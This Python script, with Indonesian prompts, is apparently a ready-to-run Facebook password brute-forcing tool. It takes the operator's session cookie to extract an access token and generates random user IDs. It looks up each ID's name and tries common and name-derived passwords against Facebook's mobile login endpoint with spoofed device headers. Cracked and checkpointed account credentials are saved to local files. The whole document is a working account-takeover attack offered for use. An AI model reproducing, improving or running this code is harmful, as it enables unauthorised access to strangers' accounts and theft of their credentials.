import sys, random, json, requests, re
from os import system, listdir
from time import sleep

get = requests.Session().get
data = [] #[cookies, token]
fail = []
ok,cp,counter = 0,0,1
graph = 'https://graph.facebook.com'

p = '\x1b[38;5;253m'
o = '\x1b[38;5;208m'
h = '\x1b[38;5;41m'
h2 = '\x1b[38;5;70m'
m = '\033[1;31m'
b = '\x1b[38;5;20m'
t = '\x1b[38;5;81m'
k = '\x1b[38;5;227m'

def login():
    try:
        data.append(open('.cookie','r').read())
        api = get('https://business.facebook.com/business_locations', cookies={'cookie':data[0]})
        data.append(re.search('(\["EAAG\w+)', api.text).group(1).replace('["',''))
        grph = get(graph +'/me?fields=name,id&access_token='+ data[1], cookies={'cookie':data[0]})
        if 'dilarang' in grph.text:
            exit(f'{b}[{m}1{b}]{p} Ip Anda Terblokir, Silahkan Gunakan Mode Pesawat')
        else:
            home(grph.json()['name'], grph.json()['id'])
    # except Exception as e:
        # print(e)
    except(FileNotFoundError,KeyError,AttributeError):
        system('clear')
        cok = input(f'{p}Gunakan Akun Facebook Baru Agar Kebal Checkpoint\nScript Random FBBruteforce By{o} https://github.com/Konrett\n\n{p}Cookies: {h2}')
        open('.cookie', 'w').write(cok)
        login()
    except ConnectionError:
        print(f'\n{b} [{m}!{b}]{p} Koneksi Bermasalah')
        
def home(name, id):
    system('clear')
    print(f'''
{p}╭━╮{m}╱╱╱╱╱╱{p}╭╮{m}╱╱╱╱╱{p}╭━━┳━━┳━━╮{m}╱╱╱{p}╭╮{m}╱╱{p}╭━╮
┃╋┣━╮╭━┳┳╯┣━┳━━╮┃━┳┫╭╮┃╭╮┣┳┳┳┫╰┳━┫━╋━┳┳┳━┳━╮
┃╮┫╋╰┫┃┃┃╋┃╋┃┃┃┃┃╭╯┃╭╮┃╭╮┃╭┫┃┃╭┫┻┫╭┫╋┃╭┫━┫┻┫
╰┻┻━━┻┻━┻━┻━┻┻┻╯╰╯{m}╱{p}╰━━┻━━┻╯╰━┻━┻━┻╯╰━┻╯╰━┻━╯      
{m}~{b}[{h}•{b}]{p} ID Akun:{h2} {id}
{m}~{b}[{h}•{b}]{p} Nama:{h2} {name}

 {b}[{m}1{b}]{p} Crack Random Id Old
 {b}[{m}2{b}]{p} Crack Random Id New
 {b}[{m}0{b}]{p} Logout / Remove Cookies
    ''')        
    chs = input(f'{m}~{b}[{h}•{b}]{p} Chose Number:{o} ')
    if chs == '1':
        old()
    elif chs == '2':
        new()
    elif chs == '0':
        system('rm .cookie')
        exit()
    else:
        print(f' {b}[{h}•{b}]{p} Number NotFound')
        sleep(2); home(name, id)

def save(code, content):
    if code == 1:
        try:
            open('okeh.txt','a').write(content)
        except FileNotFoundError:
            open('okeh.txt','w').write(content)
    else:
        try:
            open('cpeh.txt','a').write(content)
        except FileNotFoundError:
            open('cpeh.txt','w').write(content)

def anim():
    global counter, ok, cp
    sys.stdout.write(f'\r{m}~{b}[{h}/{b}]{p} Cracking {m}({h2}{str(counter)}{p} UID{m}){p} Result Ok:{m}{str(ok)} {p}~ Cp:{m}{str(cp)}')
    sys.stdout.flush()

def crack(uid, pw, ua):
    header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),"x-fb-sim-hni": str(random.randint(20000, 40000)),"x-fb-net-hni": str(random.randint(20000, 40000)),"x-fb-connection-quality": "EXCELLENT","x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA","user-agent": ua,"content-type": "application/x-www-form-urlencoded","x-fb-http-engine": "Liger"}
    param = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'json', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig':'3f555f99fb61fcd7aa0c44f58f522ef6'}
    api = get('https://b-api.facebook.com/method/auth.login', params=param, headers=header)
    if "blocked" in api.json()["error_msg"]:
        input(f'\n{b} [{m}!{b}]{p} Ip Anda Terblokir, Silahkan Gunakan Mode Pesawat')
    elif "session_key" in api.text and "EAAA" in api.text:
        print('\n {b}[{p}✓{b}]{h} {uid}{m}|{h}{pw}')
        save(1, '{uid}|{pw}\n')
        ok +=1
    elif "www.facebook.com" in api.json()["error_msg"]:
        print('\n {b}[{p}×{b}]{k} {uid}{m}|{k}{pw}')
        save(103887182, '{uid}|{pw}\n')
        cp +=1
    else:
        fail.append(uid)

'''
def crwack(uid, pw, ua):
    headers = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT","x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA","user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
    api = get("https://b-api.facebook.com/method/auth.login?format=json&email="+ uid +"&password="+ pw +"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers)
    if "blocked" in api.json()["error_msg"]:
        input(f'\n{b} [{m}!{b}]{p} Ip Anda Terblokir, Silahkan Gunakan Mode Pesawat')
    elif "session_key" in api.text and "EAAA" in api.text:
        print('\n {b}[{p}✓{b}]{h} {uid}{m}|{h}{pw}')
        save(1, '{uid}|{pw}\n')
        ok +=1
    elif "www.facebook.com" in api.json()["error_msg"]:
        print('\n {b}[{p}×{b}]{k} {uid}{m}|{k}{pw}')
        save(103887182, '{uid}|{pw}\n')
        cp +=1
    else:
        print(api.json())
        fail.append(uid)
'''

class old:
    def __init__(self):
        self.blank = open('.404', 'r').read()
        self.main()
    def main(self):
        global counter, ok, cp
        string = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
        jum = input(f'{m}~{b}[{h}•{b}]{p} Jumlah ID:{o} ')
        print(p +'━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        while(counter <= int(jum)):
            anim()
            pasw = ['123456','sayang','indonesia','kontol','anjing']
            uid = '10000'+ str(random.randint(1111111111,9999999999))
            if uid in fail or uid in open('.404', 'r').read():
                continue
            else:
                try:
                    name = get('https://graph.facebook.com/'+ uid +'?fields=name,first_name,last_name&access_token='+ data[1], cookies={'cookie':data[0]})
                    if 'not exist' in name.text:
                        open('.404','w').write(uid)
                        continue
                    elif 'dilarang' in name.text:
                        input(f'\n{b} [{m}!{b}]{p} Ip Anda Terblokir, Silahkan Gunakan Mode Pesawat')
                    else:
                        ext = name.json()
                        if ext['name'][:1] in string:
                            pasw.append(ext['name'].replace(' ',''))
                            pasw.append(ext['first_name'] + ext['first_name'])
                            pasw.append(ext['last_name'] + ext['last_name'])
                            pasw.append(ext['first_name'] +'123')
                            pasw.append(ext['first_name'] +'1234')
                            pasw.append(ext['last_name'] +'123')
                            pasw.append(ext['last_name'] +'1234')
                            #method
                            for i in range(len(pasw)):
                                ua = get('https://raw.githubusercontent.com/Konrett/my-setup/main/ua.txt').text.split('\n')[random.randrange(1,1998)]
                                crack(uid, pasw[i], ua)
                            counter +=1
                        else:
                            continue
                except ConnectionError:
                    input(f'\n{b} [{m}!{b}]{p} Koneksi Bermasalah, Enter Untuk Melanjutkan')


class new:
    def __init__(self):
        self.blank = open('.404', 'r').read()
        self.main()
    def main(self):
        global counter, ok, cp
        string = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
        jum = input(f'{m}~{b}[{h}•{b}]{p} Jumlah ID:{o} ')
        print(p +'━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        while(counter <= int(jum)):
            anim()
            pasw = ['123456','sayang','indonesia','kontol','anjing']
            uid = '1000'+ str(random.randint(11111111111,99999999999))
            if uid in fail or uid in open('.404', 'r').read():
                continue
            else:
                try:
                    name = get('https://graph.facebook.com/'+ uid +'?fields=name,first_name,last_name&access_token='+ data[1], cookies={'cookie':data[0]})
                    if 'not exist' in name.text:
                        open('.404','w').write(uid)
                        continue
                    elif 'dilarang' in name.text:
                        input(f'\n{b} [{m}!{b}]{p} Ip Anda Terblokir, Silahkan Gunakan Mode Pesawat')
                    else:
                        ext = name.json()
                        if ext['name'][:1] in string:
                            pasw.append(ext['name'].replace(' ',''))
                            pasw.append(ext['first_name'] + ext['first_name'])
                            pasw.append(ext['last_name'] + ext['last_name'])
                            pasw.append(ext['first_name'] +'123')
                            pasw.append(ext['first_name'] +'1234')
                            pasw.append(ext['last_name'] +'123')
                            pasw.append(ext['last_name'] +'1234')
                            #method
                            for i in range(len(pasw)):
                                ua = get('https://raw.githubusercontent.com/Konrett/my-setup/main/ua.txt').text.split('\n')[random.randrange(1,1998)]
                                crack(uid, pasw[i], ua)
                            counter +=1
                        else:
                            continue
                except ConnectionError:
                    input(f'\n{b} [{m}!{b}]{p} Koneksi Bermasalah, Enter Untuk Melanjutkan')
             
                
        
                    
if __name__=='__main__':
    login()
